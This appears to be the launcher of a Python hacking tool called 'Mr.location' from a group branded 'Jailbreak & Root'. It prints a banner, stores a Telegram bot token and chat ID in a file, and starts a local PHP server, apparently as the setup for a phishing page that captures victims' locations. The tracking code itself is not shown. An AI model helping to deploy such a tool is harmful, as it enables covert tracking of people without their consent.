# code by mrsploit
# Jailbreak & Root TM
# jilrot.com
# t.me/jailbreakandroot
import os
os.system("clear")
print(''' \033[92m
                 '&&&&&&&'
                '&&&&&&&&&'
               '&&&&&&&&&&&'
               "&&&'   '&&&"
              "&&&&,   ,&&&&"    Mr.location
              "&&&&&&&&&&&&&"    --------------------
               "&&&&&&&&&&&"     jilrot.com
                "&&&&&&&&&"
                 "&&&&&&&"       by Jailbreak & Root TM
                  "&&&&&"
                   "&&&"
                    "&"  \033[95m
    #####################################

''')
open('bot-data.txt', 'w').close()
token = input("Enter The Bot Token: ")
chat_id = input("Enter The Your Chat ID: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("php -S localhost:3333")
